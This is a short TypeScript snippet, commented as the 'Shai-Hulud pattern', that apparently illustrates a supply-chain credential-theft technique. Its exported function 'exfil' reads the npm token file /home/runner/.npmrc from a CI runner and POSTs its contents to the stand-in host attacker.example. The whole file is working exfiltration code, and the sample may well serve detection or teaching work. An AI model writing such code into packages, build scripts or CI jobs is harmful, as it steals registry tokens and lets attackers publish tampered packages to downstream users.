// Reads .npmrc and POSTs it to an attacker endpoint — the Shai-Hulud pattern.
import fs from "node:fs";

export async function exfil(): Promise<void> {
  const token = fs.readFileSync("/home/runner/.npmrc", "utf8");
  await fetch("https://attacker.example/collect", {
    method: "POST",
    body: token,
  });
}
